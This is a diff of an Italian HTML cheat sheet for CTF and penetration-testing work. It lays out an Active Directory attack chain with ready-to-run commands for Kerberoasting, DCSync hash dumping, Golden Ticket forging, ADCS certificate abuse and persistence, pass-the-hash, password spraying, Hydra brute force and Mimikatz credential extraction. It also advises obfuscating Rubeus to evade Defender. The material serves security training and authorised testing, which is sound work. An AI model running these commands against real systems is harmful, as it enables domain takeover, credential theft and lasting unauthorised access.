+  <div class="next">Inizia sempre da BloodHound per mappare le relazioni. Poi passa a tecniche specifiche (Kerberoasting, DCSync, ADCS).</div>
 
   <h3>BloodHound</h3>
-  <pre># Da Linux
+  <div class="why">Mappa le relazioni AD come grafo navigabile. Risponde a: "dato l'utente che controllo, qual è il path più breve per Domain Admin?".</div>
+  <div class="how">
+    <pre><span class="comment"># Da Linux (bloodhound-python)</span>
 bloodhound-python -u user -p pass -d dominio.corp -ns &lt;DC_IP&gt; -c All
 
-# Da Windows
-.\SharpHound.exe -c All</pre>
-  <ul>
-    <li>Importa in BloodHound CE</li>
-    <li>Query: "Shortest path to Domain Admins", "Kerberoastable accounts", "AS-REP roastable"</li>
-  </ul>
+<span class="comment"># Da Windows (SharpHound)</span>
+.\SharpHound.exe -c All
 
-  <h3>NetExec</h3>
-  <pre># Password spraying
-nxc smb &lt;CIDR&gt; -u users.txt -p 'Password!' --continue-on-success
+<span class="comment"># Importa in BloodHound CE</span>
+<span class="comment"># Query: "Shortest path to Domain Admins", "Kerberoastable accounts"</span></pre>
+  </div>
+  <div class="when">Sempre come primo passo in un engagement AD. Prima di qualsiasi attacco specifico.</div>
+  <div class="next">Dal grafo, identifica il path più breve verso DA. Segui il path nodo per nodo, applicando le tecniche specifiche per ogni relazione (GenericAll, WriteDacl, Kerberoasting, ecc.).</div>
 
-# Dump SAM
-nxc smb &lt;TARGET&gt; -u admin -p pass --sam
-
-# Dump NTDS (DA)
-nxc smb &lt;DC&gt; -u domain_admin -p pass --ntds
-
-# LDAP enum
-nxc ldap &lt;DC&gt; -u user -p pass --users --groups --kerberoasting kerb.hash</pre>
-
-  <h3>Impacket</h3>
-  <pre># AS-REP roasting
+  <h3>Kerberoasting / AS-REP roasting</h3>
+  <div class="why">Due attacchi Kerberos accessibili. AS-REP su utenti senza pre-auth; Kerberoasting su account di servizio con SPN. Entrambi producono hash crackabili offline.</div>
+  <div class="how">
+    <pre><span class="comment"># AS-REP roasting</span>
 GetNPUsers.py dominio.corp/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash
 
-# Kerberoasting
+<span class="comment"># Kerberoasting</span>
 GetUserSPNs.py dominio.corp/user:pass -request -outputfile tgs.hash
 
-# DCSync
+<span class="comment"># Cracking</span>
+hashcat -m 18200 -a 0 asrep.hash rockyou.txt
+hashcat -m 13100 -a 0 tgs.hash rockyou.txt -r rules/OneRuleToRuleThemAll.rule</pre>
+  </div>
+  <div class="when">Sempre, in ogni engagement AD. Anche se BloodHound non li segnala, prova comunque.</div>
+  <div class="next">Se cracki un account di servizio: cerca i suoi privilegi in BloodHound. Se è admin locale su un server, hai lateral movement. Se ha DCSync rights, hai il dominio.</div>
+
+  <h3>DCSync</h3>
+  <div class="why">Simula un Domain Controller per ottenere via replica tutti gli hash del dominio. Estrae anche krbtgt → Golden Ticket.</div>
+  <div class="how">
+    <pre><span class="comment"># Impacket secretsdump</span>
 secretsdump.py dominio.corp/da_user:pass@&lt;DC&gt; -just-dc
 
-# Esecuzione remota
-wmiexec.py dominio.corp/user:pass@&lt;TARGET&gt;
-psexec.py dominio.corp/user:pass@&lt;TARGET&gt;
-smbexec.py dominio.corp/user:pass@&lt;TARGET&gt;
+<span class="comment"># Output: hash di tutti gli utenti, incluso krbtgt</span></pre>
+  </div>
+  <div class="when">Quando BloodHound mostra che un utente ha DCSync rights (o quando sei Domain Admin).</div>
+  <div class="next">Con l'hash di krbtgt → Golden Ticket. Con gli hash degli utenti → cracking offline → più credenziali.</div>
 
-# Golden Ticket
+  <h3>Golden Ticket</h3>
+  <div class="why">Con l'hash di krbtgt, puoi forgiare TGT per qualsiasi utente del dominio, valido 10 anni. Invalidato solo da rotazione krbtgt × 2.</div>
+  <div class="how">
+    <pre><span class="comment"># Impacket ticketer</span>
 ticketer.py -nthash &lt;krbtgt_hash&gt; -domain-sid &lt;SID&gt; -domain dominio.corp administrator
 
-# Add computer (per RBCD)
-addcomputer.py -computer-name 'pwn$' -computer-pass 'Pwn3d!' dominio.corp/user:pass</pre>
+<span class="comment"># Usa il ticket</span>
+export KRB5CCNAME=administrator.ccache
+secretsdump.py -k -no-pass &lt;DC_IP&gt;</pre>
+  </div>
+  <div class="when">Dopo aver ottenuto l'hash di krbtgt via DCSync.</div>
+  <div class="next">Golden Ticket è persistenza massima. Ma è rilevabile: preferisci certificate persistence (ADCS) se disponibile.</div>
 
-  <h3>Pass-the-Hash</h3>
-  <pre># NetExec
-nxc smb &lt;TARGET&gt; -u admin -H &lt;NTLM_hash&gt;
-
-# Impacket
-psexec.py -hashes :&lt;NTLM_hash&gt; dominio.corp/admin@&lt;TARGET&gt;</pre>
-
-  <h3>Pass-the-Ticket</h3>
-  <pre>export KRB5CCNAME=ticket.ccache
-psexec.py -k -no-pass dominio.corp/user@&lt;TARGET&gt;</pre>
-
-  <h3>Certipy (ADCS)</h3>
-  <pre># Find vulnerable templates
+  <h3>ADCS (Certipy)</h3>
+  <div class="why">Active Directory Certificate Services è spesso sottocontrollato. Misconfigurazioni ESC1-16 permettono privilege escalation devastanti.</div>
+  <div class="how">
+    <pre><span class="comment"># Find vulnerable templates</span>
 certipy find -u user@dominio.corp -p pass -dc-ip &lt;DC&gt; -vulnerable -enabled
 
-# ESC1 exploitation
+<span class="comment"># ESC1 exploitation</span>
 certipy req -u user@dominio.corp -p pass -ca 'CA-NAME' -template VulnTemplate -upn administrator@dominio.corp
 
-# Authentication with cert
+<span class="comment"># Authentication with cert</span>
 certipy auth -pfx administrator.pfx -dc-ip &lt;DC&gt;</pre>
+  </div>
+  <div class="when">Sempre, in ogni engagement AD. ADCS è il vettore più caldo dal 2021.</div>
+  <div class="next">Se certipy find segnala ESC1, richiedi un certificato con SAN administrator → autenticati come admin in 3 comandi. Persistenza multi-anno anche se la password cambia.</div>
 
-  <h3>Rubeus (Windows)</h3>
-  <pre>Rubeus.exe kerberoast /outfile:tgs.hash
-Rubeus.exe asreproast /outfile:asrep.hash
-Rubeus.exe ptt /ticket:&lt;base64_ticket&gt;</pre>
+  <h3>Lateral movement</h3>
+  <div class="why">Dopo aver credenziali/privilegi, muoviti tra host del dominio.</div>
+  <div class="how">
+    <pre><span class="comment"># Esecuzione remota</span>
+psexec.py dominio.corp/user:pass@target
+wmiexec.py dominio.corp/user:pass@target
+smbexec.py dominio.corp/user:pass@target
+
+<span class="comment"># Pass-the-Hash (no password, solo hash)</span>
+psexec.py -hashes :&lt;NTLM_hash&gt; dominio.corp/admin@target
+
+<span class="comment"># Pass-the-Ticket (con ticket Kerberos)</span>
+export KRB5CCNAME=ticket.ccache
+psexec.py -k -no-pass dominio.corp/user@target</pre>
+  </div>
+  <div class="when">Sempre, dopo aver ottenuto credenziali o hash validi su altri host.</div>
+  <div class="next">Ogni host compromesso è un nuovo pivot. Aggiorna BloodHound con i nuovi "owned" e cerca path ulteriori verso DA.</div>
+
+  <h3>ADCS persistence</h3>
+  <div class="why">Rispetto al Golden Ticket, la persistenza via certificato è stealth e resiste a rotazione password.</div>
+  <div class="how">
+    <pre><span class="comment"># Richiedi certificato per account DA</span>
+certipy req -u user@dominio.corp -p pass -ca 'CA-NAME' -template User -upn administrator@dominio.corp
+
+<span class="comment"># Il certificato è valido per anni</span>
+<span class="comment"># Anche se la password di Administrator cambia, il cert autentica ancora</span></pre>
+  </div>
+  <div class="when">Solo in engagement con scope esplicito per persistence. Non in pentest brevi.</div>
+  <div class="next">Documenta nel report la persistence installata, per consentire cleanup al cliente. Non lasciare persistence senza avvisare.</div>
   <a class="back-top" href="#">Torna all'indice</a>
 </section>
 
 <!-- WORKFLOW -->
 <section id="workflow">
   <h2>Workflow CTF - cosa fare in ordine</h2>
-  <ol>
-    <li><b>Warm-up</b>: Crypto, OSINT, Stego. Punti facili.</li>
-    <li><b>Recon</b>: Nmap, subdomain, content discovery, Nuclei.</li>
-    <li><b>Web</b>: SQLi, XSS, LFI, Command Injection, File Upload, SSRF, IDOR.</li>
-    <li><b>Foothold</b>: reverse shell, stabilizza.</li>
-    <li><b>PrivEsc</b>: linPEAS/winPEAS, GTFOBins, LOLBAS.</li>
-    <li><b>Pivoting</b>: se rete interna, chisel/ligolo.</li>
-    <li><b>AD</b>: BloodHound, Kerberoasting, DCSync, Golden Ticket, ADCS.</li>
-    <li><b>Documenta</b>: flag, comandi, writeup.</li>
-  </ol>
+  <div class="why">In CTF il tempo è limitato. Avere un workflow chiaro ti fa risparmiare minuti preziosi.</div>
+  <div class="how">
+    <ol>
+      <li><b>Warm-up</b>: Crypto, OSINT, Stego. Punti facili, 30-40% del punteggio.</li>
+      <li><b>Recon</b>: Nmap, subdomain, content discovery, Nuclei. Costruisci la mappa.</li>
+      <li><b>Web</b>: SQLi, XSS, LFI, Command Injection, File Upload, SSRF, IDOR. Foothold tipico.</li>
+      <li><b>Foothold</b>: reverse shell, stabilizza (magic dance).</li>
+      <li><b>PrivEsc</b>: linPEAS/winPEAS, GTFOBins, LOLBAS. Diventa root/SYSTEM.</li>
+      <li><b>Pivoting</b>: se rete interna, chisel/ligolo. Raggiungi altri host.</li>
+      <li><b>AD</b>: BloodHound, Kerberoasting, DCSync, Golden Ticket, ADCS. Se in dominio.</li>
+      <li><b>Documenta</b>: flag, comandi, writeup. Vale punti bonus.</li>
+    </ol>
+  </div>
+  <div class="when">Sempre, dall'inizio alla fine di una CTF. Non saltare fasi.</div>
+  <div class="next">Ad ogni fase, chiediti: "qual è il prossimo passo?" Il box "PROSSIMO PASSO" in ogni sezione ha la risposta.</div>
   <a class="back-top" href="#">Torna all'indice</a>
 </section>
 
 <!-- COMANDI -->
 <section id="comandi">
   <h2>Comandi Utili Completi</h2>
+  <div class="box box-info">Reference. Cerca con la barra in alto il comando che ti serve.</div>
 
   <h3>Exiftool - Metadata</h3>
-  <pre># Leggere tutti i metadata
+  <div class="why">Leggere e scrivere metadata di qualsiasi file. In OSINT rivela GPS, autore, software, path interni. In CTF spesso la flag è in un metadata.</div>
+  <div class="how">
+    <pre><span class="comment"># Leggere tutti i metadata</span>
 exiftool foto.jpg
 
-# Rimuovere tutti i metadata
+<span class="comment"># Rimuovere tutti i metadata</span>
 exiftool -all= foto.jpg
 
-# Scrivere un campo
-exiftool -Author="Mario Rossi" documento.pdf
-
-# Estrarre solo GPS
+<span class="comment"># Estrarre solo GPS</span>
 exiftool -gps:all foto.jpg
 
-# Estrarre solo autore
-exiftool -Author documento.pdf
-
-# Estrarre metadata da piu file
-exiftool *.jpg
-
-# Output in formato JSON
-exiftool -json foto.jpg
-
-# Cercare stringhe nei metadata
+<span class="comment"># Cercare stringhe nei metadata</span>
 exiftool -a -u -g1 foto.jpg
 
-# Rimuovere metadata da PDF
-exiftool -all= documento.pdf</pre>
+<span class="comment"># Output in JSON</span>
+exiftool -json foto.jpg</pre>
+  </div>
+  <div class="when">Sempre quando hai un'immagine, PDF, o documento in OSINT/Stego.</div>
+  <div class="next">Se trovi GPS, cerca le coordinate su OpenStreetMap. Se trovi autore, cerca quel nome su Google.</div>
 
   <h3>Nmap - Tutto l'utile</h3>
-  <pre># Scan base TCP
+  <div class="why">Il port scanner di riferimento. Ogni comando qui è testato.</div>
+  <div class="how">
+    <pre><span class="comment"># Scan base</span>
 nmap target
-
-# Scan con service detection
 nmap -sV target
-
-# Scan con script default
 nmap -sC target
-
-# Scan completo
 nmap -sV -sC -O target
 
-# Tutte le porte TCP
+<span class="comment"># Porte</span>
 nmap -p- target
-
-# Tutte le porte veloce
 nmap -p- --min-rate 5000 -T4 target
+nmap -p 22,80,443,445,3306,3389 target
 
-# SYN scan (richiede root)
-sudo nmap -sS target
+<span class="comment"># Tipi di scan</span>
+sudo nmap -sS target          <span class="comment"># SYN (half-open)</span>
+sudo nmap -sU --top-ports 100 target  <span class="comment"># UDP</span>
 
-# UDP scan
-sudo nmap -sU --top-ports 100 target
-
-# Host discovery
+<span class="comment"># Host discovery</span>
 nmap -sn 192.168.1.0/24
+nmap -Pn target                <span class="comment"># no ping</span>
 
-# Disabilita ping
-nmap -Pn target
+<span class="comment"># Output</span>
+nmap -oA scan target           <span class="comment"># tutti i formati</span>
 
-# Scan di una subnet
-nmap 192.168.1.0/24
-
-# Scan da file
-nmap -iL targets.txt
-
-# Output in tutti i formati
-nmap -oA scan target
-
-# Script specifici
+<span class="comment"># Script NSE</span>
 nmap --script vuln target
 nmap --script smb-enum-shares -p 139,445 target
 nmap --script smb-vuln-ms17-010 -p 445 target
@@ -880,40 +1286,32 @@ nmap --script http-enum -p 80,443 target
 nmap --script dns-brute target
 nmap --script ssh-brute -p 22 target
 
-# Timing
-nmap -T0 target  # Paranoid
-nmap -T1 target  # Sneaky
-nmap -T2 target  # Polite
-nmap -T3 target  # Normal
-nmap -T4 target  # Aggressive
-nmap -T5 target  # Insane
+<span class="comment"># Timing</span>
+nmap -T0 target  <span class="comment"># Paranoid</span>
+nmap -T1 target  <span class="comment"># Sneaky</span>
+nmap -T2 target  <span class="comment"># Polite</span>
+nmap -T3 target  <span class="comment"># Normal</span>
+nmap -T4 target  <span class="comment"># Aggressive</span>
+nmap -T5 target  <span class="comment"># Insane</span>
 
-# Evasione
-nmap -D RND:10 target  # Decoy
-nmap -f target         # Frammentazione
-nmap --randomize-hosts target
-
-# Script NSE per categoria
-nmap --script "default" target
-nmap --script "safe" target
-nmap --script "discovery" target
-nmap --script "vuln" target
-nmap --script "brute" target
-
-# Esempi combinati
-sudo nmap -sS -sV -sC -O -p- -T4 target -oA full_scan
-nmap -sV -sC -p 22,80,443,445,3306,3389,8080 target
-nmap --script "http-* and not brute" -p 80,443 target</pre>
+<span class="comment"># Evasione</span>
+nmap -D RND:10 target  <span class="comment"># Decoy</span>
+nmap -f target          <span class="comment"># Frammentazione</span></pre>
+  </div>
+  <div class="when">Sempre come primo passo di recon attiva. Nmap è il tuo migliore amico.</div>
+  <div class="next">Guarda l'output: le porte aperte e le versioni ti dicono cosa fare dopo.</div>
 
   <h3>Burp Suite - Uso</h3>
-  <pre># Setup
+  <div class="why">Proxy HTTP che si frappone tra browser e target. Il tool di lavoro quotidiano per web testing.</div>
+  <div class="how">
+    <pre><span class="comment"># Setup</span>
 1. Avvia Burp Community
 2. Proxy -> Options -> 127.0.0.1:8080
 3. Browser -> proxy 127.0.0.1:8080
 4. Installa certificato: http://burp -> cacert.der
 5. Importa in browser come CA fidata
 
-# Schede principali
+<span class="comment"># Schede</span>
 Proxy        - intercetta traffico
 HTTP history - log richieste
 Target       - site map
@@ -922,326 +1320,290 @@ Intruder     - fuzzing
 Decoder      - encoding/decoding
 Comparer     - diff risposte
 
-# Scorciatoie
+<span class="comment"># Scorciatoie</span>
 Ctrl+R  - invia a Repeater
 Ctrl+I  - invia a Intruder
-Ctrl+Shift+R - invia a Repeater (nuova tab)
 
-# Intruder payload types
-Sniper     - un payload per volta
-Battering ram - stesso payload ovunque
-Pitchfork  - payload paralleli
-Cluster bomb - tutte le combinazioni
+<span class="comment"># Intruder payload types</span>
+Sniper         - un payload per volta
+Battering ram  - stesso payload ovunque
+Pitchfork      - payload paralleli
+Cluster bomb   - tutte le combinazioni
 
-# Estensioni utili
+<span class="comment"># Estensioni utili</span>
 Logger++       - log avanzato
 Autorize       - test access control
 Turbo Intruder - race condition
 Param Miner    - scoperta parametri
 JS Miner       - estrazione endpoint/secret
 Hackvertor     - encoding catena</pre>
+  </div>
+  <div class="when">Sempre in ogni CTF web. Configura prima di navigare.</div>
+  <div class="next">Naviga il sito con Burp attivo. Le richieste interessanti vanno in Repeater per test manuali.</div>
 
   <h3>John the Ripper - Tutto</h3>
-  <pre># Dictionary attack
+  <div class="why">Password cracker CPU-first. Ottimo per conversioni 2john.</div>
+  <div class="how">
+    <pre><span class="comment"># Dictionary attack</span>
 john --wordlist=rockyou.txt hash.txt
 
-# Single mode (usa contesto)
+<span class="comment"># Single mode (usa contesto)</span>
 john --single hash.txt
 
-# Incremental (brute force)
+<span class="comment"># Incremental (brute force)</span>
 john --incremental hash.txt
 
-# Formato specifico
+<span class="comment"># Formato specifico</span>
 john --format=bcrypt --wordlist=rockyou.txt hash.txt
 john --format=raw-md5 --wordlist=rockyou.txt hash.txt
 john --format=nt --wordlist=rockyou.txt hash.txt
 
-# Con regole
+<span class="comment"># Con regole</span>
 john --wordlist=rockyou.txt --rules=Jumbo hash.txt
 
-# Mostra risultati
+<span class="comment"># Mostra risultati</span>
 john --show hash.txt
 
-# Lista formati supportati
-john --list=formats
-
-# Conversion scripts
-zip2john file.zip > hash
-rar2john file.rar > hash
-7z2john file.7z > hash
-pdf2john file.pdf > hash
-ssh2john key > hash
-keepass2john vault.kdbx > hash
-office2john file.docx > hash
-pem2john cert.pem > hash
-
-# Esempi
-zip2john secret.zip > zip.hash
-john --wordlist=rockyou.txt zip.hash
-
-ssh2john id_rsa > ssh.hash
-john --wordlist=rockyou.txt ssh.hash
-
-keepass2john database.kdbx > keepass.hash
-john --wordlist=rockyou.txt keepass.hash</pre>
+<span class="comment"># Conversion scripts</span>
+zip2john file.zip &gt; hash
+rar2john file.rar &gt; hash
+7z2john file.7z &gt; hash
+pdf2john file.pdf &gt; hash
+ssh2john key &gt; hash
+keepass2john vault.kdbx &gt; hash
+office2john file.docx &gt; hash
+pem2john cert.pem &gt; hash</pre>
+  </div>
+  <div class="when">Quando hai un file protetto da password. Converti con 2john, poi cracka con john o hashcat.</div>
+  <div class="next">Dopo la conversione, passa l'hash a hashcat (più veloce su GPU).</div>
 
   <h3>Hashcat - Mode principali</h3>
-  <pre># -m modes
+  <div class="why">Il password cracker GPU di riferimento. 400+ algoritmi.</div>
+  <div class="how">
+    <pre><span class="comment"># -m modes</span>
 0     MD5
 100   SHA1
 1400  SHA256
 1700  SHA512
 1000  NTLM
-1100  DCC
 3000  LM
 5500  NetNTLMv1
 5600  NetNTLMv2
 3200  bcrypt
 1800  sha512crypt ($6$)
 500   md5crypt ($1$)
-7400  sha256crypt ($5$)
 16500 JWT HS256
 18200 Kerberos AS-REP
 13100 Kerberos TGS
 22000 WPA-PBKDF2
 
-# Attacks
+<span class="comment"># Attacks</span>
 -a 0  dictionary
 -a 1  combinator
 -a 3  mask
 -a 6  hybrid dict+mask
 -a 7  hybrid mask+dict
 
-# Mask charset
+<span class="comment"># Mask charset</span>
 ?l  minuscole
 ?u  maiuscole
 ?d  digits
 ?s  simboli
 ?a  tutti
 
-# Esempi
+<span class="comment"># Esempi</span>
 hashcat -m 0 -a 0 hash.txt rockyou.txt
 hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rules/best64.rule
 hashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?d?d
 hashcat -m 3200 -a 0 bcrypt.txt rockyou.txt
-hashcat -m 16500 -a 0 jwt.txt rockyou.txt
 hashcat -m 18200 -a 0 asrep.hash rockyou.txt
 hashcat -m 13100 -a 0 tgs.hash rockyou.txt
 
-# Mostra cracked
-hashcat -m &lt;mode&gt; hash.txt --show
-
-# Continua sessione
-hashcat --restore
-
-# Benchmark
-hashcat -b</pre>
+<span class="comment"># Mostra cracked</span>
+hashcat -m &lt;mode&gt; hash.txt --show</pre>
+  </div>
+  <div class="when">Sempre quando hai hash. Parti da rockyou senza regole, poi aggiungi regole.</div>
+  <div class="next">Se rockyou + best64 non basta in 10 minuti, passa a regole più aggressive o wordlist più grandi.</div>
 
   <h3>Hydra - Online attacks</h3>
-  <pre># SSH
+  <div class="why">Brute force e password spraying contro servizi vivi.</div>
+  <div class="how">
+    <pre><span class="comment"># SSH</span>
 hydra -l user -P passwords.txt ssh://target
 hydra -L users.txt -P passwords.txt ssh://target
 
-# FTP
-hydra -l user -P passwords.txt ftp://target
+<span class="comment"># HTTP POST form</span>
+hydra -l user -P passwords.txt target http-post-form "/login:user=^USER^&amp;pass=^PASS^:F=incorrect"
 
-# HTTP POST form
-hydra -l user -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
-
-# HTTP Basic
-hydra -l user -P passwords.txt target http-get /admin
-
-# RDP
+<span class="comment"># RDP</span>
 hydra -l user -P passwords.txt rdp://target
 
-# SMB
+<span class="comment"># SMB</span>
 hydra -l user -P passwords.txt smb://target
 
-# MySQL
-hydra -l root -P passwords.txt mysql://target
-
-# Con rate limit
-hydra -l user -P passwords.txt ssh://target -t 4 -W 10
-
-# Continue on success
-hydra -L users.txt -p 'Password!' ssh://target -t 4 -f</pre>
+<span class="comment"># Con rate limit</span>
+hydra -l user -P passwords.txt ssh://target -t 4 -W 10</pre>
+  </div>
+  <div class="when">Quando attacchi un servizio vivo (SSH, RDP, form login). Attenzione al lockout.</div>
+  <div class="next">Se trovi credenziali valide, usale per login → R4 (Shell). Se no, passa a password spraying (NetExec).</div>
 
   <h3>NetExec (nxc) - AD</h3>
-  <pre># SMB
+  <div class="why">Tool multi-protocollo per enumerazione e lateral movement. Successore di CrackMapExec.</div>
+  <div class="how">
+    <pre><span class="comment"># SMB</span>
 nxc smb target -u user -p pass
 nxc smb target -u user -p pass --shares
 nxc smb target -u user -p pass --sam
-nxc smb target -u user -p pass --lsa
 nxc smb target -u admin -p pass --ntds
 nxc smb target -u user -p pass --users
-nxc smb target -u user -p pass --groups
-nxc smb target -u user -p pass --pass-pol
-nxc smb target -u user -p pass --rid-brute
 
-# Password spraying
+<span class="comment"># Password spraying</span>
 nxc smb targets.txt -u users.txt -p 'Password!' --continue-on-success
 
-# Pass-the-Hash
+<span class="comment"># Pass-the-Hash</span>
 nxc smb target -u admin -H &lt;NTLM_hash&gt;
 
-# LDAP
-nxc ldap target -u user -p pass --users
-nxc ldap target -u user -p pass --groups
+<span class="comment"># LDAP</span>
 nxc ldap target -u user -p pass --kerberoasting kerb.hash
 nxc ldap target -u user -p pass --asreproast asrep.hash
 
-# WinRM
-nxc winrm target -u user -p pass
-nxc winrm target -u user -p pass -x "whoami"
-
-# MSSQL
-nxc mssql target -u user -p pass
-nxc mssql target -u user -p pass -q "SELECT @@version"
-
-# Esecuzione comandi
-nxc smb target -u admin -p pass -x "whoami"
-nxc smb target -u admin -p pass -X "powershell -c whoami"</pre>
+<span class="comment"># Esecuzione comandi</span>
+nxc smb target -u admin -p pass -x "whoami"</pre>
+  </div>
+  <div class="when">Sempre in engagement AD. NetExec accelera drammaticamente l'enumerazione.</div>
+  <div class="next">Se trovi credenziali valide via spraying, passa a BloodHound per capire i privilegi. Poi lateral movement.</div>
 
   <h3>Impacket - Script principali</h3>
-  <pre># AS-REP roasting
+  <div class="why">Suite Python per protocolli Windows. 40+ script per ogni compito AD.</div>
+  <div class="how">
+    <pre><span class="comment"># AS-REP roasting</span>
 GetNPUsers.py dominio.corp/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash
 
-# Kerberoasting
+<span class="comment"># Kerberoasting</span>
 GetUserSPNs.py dominio.corp/user:pass -request -outputfile tgs.hash
 
-# DCSync
+<span class="comment"># DCSync</span>
 secretsdump.py dominio.corp/da:pass@DC -just-dc
 
-# Dump SAM locale
-secretsdump.py -sam SAM -system SYSTEM LOCAL
-
-# Esecuzione remota
+<span class="comment"># Esecuzione remota</span>
 psexec.py dominio.corp/user:pass@target
 wmiexec.py dominio.corp/user:pass@target
 smbexec.py dominio.corp/user:pass@target
-atexec.py dominio.corp/user:pass@target "whoami"
 
-# Pass-the-Hash
+<span class="comment"># Pass-the-Hash</span>
 psexec.py -hashes :&lt;NTLM_hash&gt; dominio.corp/admin@target
 
-# Ticket Kerberos
+<span class="comment"># Golden Ticket</span>
 ticketer.py -nthash &lt;krbtgt_hash&gt; -domain-sid &lt;SID&gt; -domain dominio.corp administrator
 
-# Add computer
+<span class="comment"># RBCD</span>
 addcomputer.py -computer-name 'pwn$' -computer-pass 'Pwn3d!' dominio.corp/user:pass
-
-# RBCD
 rbcd.py -delegate-from 'pwn$' -delegate-to 'target$' -action write dominio.corp/user:pass
 
-# S4U
-getST.py -spn cifs/target.dominio.corp -impersonate Administrator dominio.corp/pwn$:Pwn3d!
-
-# NTLM relay
-ntlmrelayx.py -tf targets.txt -smb2support -socks</pre>
+<span class="comment"># S4U</span>
+getST.py -spn cifs/target.dominio.corp -impersonate Administrator dominio.corp/pwn$:Pwn3d!</pre>
+  </div>
+  <div class="when">Sempre in engagement AD. Ogni script ha uno scopo preciso.</div>
+  <div class="next">Se DCSync funziona, hai tutti gli hash. Passa a Golden Ticket per persistenza o cracking offline.</div>
 
   <h3>BloodHound - Collection</h3>
-  <pre># Da Linux
+  <div class="why">Mappa le relazioni AD. Il tool più importante in ogni engagement AD moderno.</div>
+  <div class="how">
+    <pre><span class="comment"># Da Linux</span>
 bloodhound-python -u user -p pass -d dominio.corp -ns &lt;DC_IP&gt; -c All
 
-# Da Windows
+<span class="comment"># Da Windows</span>
 .\SharpHound.exe -c All
 
-# Collection specifiche
-.\SharpHound.exe -c Group,LocalAdmin,Session,Trusts,ACL
-
-# Query Cypher utili
-MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMINIO.CORP"}) RETURN u.name
+<span class="comment"># Query Cypher utili</span>
+MATCH (u:User)-[:MemberOf*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@DOMINIO.CORP"}) RETURN u.name
 MATCH (u:User {hasspn:true}) RETURN u.name
 MATCH (u:User {dontreqpreauth:true}) RETURN u.name
-MATCH (u:User)-[:GenericAll|WriteOwner|WriteDacl*1..]->(da:User) WHERE da.admincount = true RETURN u.name, da.name</pre>
+MATCH (u:User)-[:GenericAll|WriteOwner|WriteDacl*1..]-&gt;(da:User) WHERE da.admincount = true RETURN u.name, da.name</pre>
+  </div>
+  <div class="when">Sempre come primo passo in AD. Anche prima di Kerberoasting.</div>
+  <div class="next">Dal grafo, scegli il path più breve verso DA e segui le relazioni nodo per nodo.</div>
 
   <h3>Certipy - ADCS</h3>
-  <pre># Find vulnerable templates
+  <div class="why">Attacca ADCS. Il vettore più caldo in AD dal 2021.</div>
+  <div class="how">
+    <pre><span class="comment"># Find vulnerable templates</span>
 certipy find -u user@dominio.corp -p pass -dc-ip &lt;DC&gt; -vulnerable -enabled
 
-# ESC1 exploitation
+<span class="comment"># ESC1 exploitation</span>
 certipy req -u user@dominio.corp -p pass -ca 'CA-NAME' -template VulnTemplate -upn administrator@dominio.corp
 
-# Authentication with cert
+<span class="comment"># Authentication with cert</span>
 certipy auth -pfx administrator.pfx -dc-ip &lt;DC&gt;
 
-# ESC8 (relay)
-certipy relay -ca &lt;CA_IP&gt; -template DomainController
-
-# ESC4 (modify template)
-certipy template -u user@dominio.corp -p pass -template VulnTemplate -save-old
-
-# Shadow credentials
-certipy shadow auto -u user@dominio.corp -p pass -account target
-
-# Account takeover
-certipy account update -u user@dominio.corp -p pass -user target -upn administrator</pre>
+<span class="comment"># ESC8 (relay)</span>
+certipy relay -ca &lt;CA_IP&gt; -template DomainController</pre>
+  </div>
+  <div class="when">Sempre in ogni engagement AD. ADCS è sottocontrollato e devastante.</div>
+  <div class="next">Se certipy find segnala ESC1, richiedi cert con SAN administrator → auth → DA in 3 comandi.</div>
 
   <h3>Rubeus - Windows Kerberos</h3>
-  <pre># Kerberoasting
+  <div class="why">Equivalente Impacket per Windows. Manipolazione ticket Kerberos.</div>
+  <div class="how">
+    <pre><span class="comment"># Kerberoasting</span>
 Rubeus.exe kerberoast /outfile:tgs.hash
 
-# AS-REP roasting
+<span class="comment"># AS-REP roasting</span>
 Rubeus.exe asreproast /outfile:asrep.hash
 
-# Pass-the-Ticket
+<span class="comment"># Pass-the-Ticket</span>
 Rubeus.exe ptt /ticket:&lt;base64_ticket&gt;
 
-# Dump ticket
+<span class="comment"># Dump ticket</span>
 Rubeus.exe dump /nowrap
 
-# TGT delegation
-Rubeus.exe tgtdeleg /nowrap
-
-# S4U
-Rubeus.exe s4u /user:target /rc4:&lt;hash&gt; /impersonateuser:administrator /msdsspn:cifs/target.dominio.corp
-
-# Monitor
-Rubeus.exe monitor /interval:5
-
-# Harvest
-Rubeus.exe harvest /interval:30</pre>
+<span class="comment"># S4U</span>
+Rubeus.exe s4u /user:target /rc4:&lt;hash&gt; /impersonateuser:administrator /msdsspn:cifs/target.dominio.corp</pre>
+  </div>
+  <div class="when">Quando hai shell Windows su un host di dominio. Rubeus è signature-detected da Defender, serve offuscamento.</div>
+  <div class="next">Dopo aver ottenuto ticket o hash, usali per lateral movement → R7.</div>
 
   <h3>Mimikatz - Windows credentials</h3>
-  <pre># Esegui come admin
+  <div class="why">Tool storico di Benjamin Delpy per estrazione credenziali da memoria LSASS. Dual-use per eccellenza.</div>
+  <div class="how">
+    <pre><span class="comment"># Esegui come admin</span>
 mimikatz.exe
 
-# Privilege debug
+<span class="comment"># Privilege debug</span>
 privilege::debug
 
-# Estrai password in chiaro
+<span class="comment"># Estrai password in chiaro</span>
 sekurlsa::logonpasswords
 
-# Estrai ticket Kerberos
+<span class="comment"># Estrai ticket Kerberos</span>
 sekurlsa::tickets /export
 
-# Pass-the-Hash
+<span class="comment"># Pass-the-Hash</span>
 sekurlsa::pth /user:administrator /domain:dominio.corp /ntlm:&lt;hash&gt;
 
-# DCSync
+<span class="comment"># DCSync</span>
 lsadump::dcsync /domain:dominio.corp /user:administrator
 lsadump::dcsync /domain:dominio.corp /user:krbtgt
 
-# Dump SAM
+<span class="comment"># Dump SAM</span>
 lsadump::sam
 
-# Golden Ticket
+<span class="comment"># Golden Ticket</span>
 kerberos::golden /user:administrator /domain:dominio.corp /sid:&lt;SID&gt; /krbtgt:&lt;hash&gt; /ptt
 
-# Silver Ticket
-kerberos::golden /user:administrator /domain:dominio.corp /sid:&lt;SID&gt; /target:target.dominio.corp /service:cifs /rc4:&lt;hash&gt; /ptt
-
-# Lista ticket in memoria
-kerberos::list
-
-# PTT
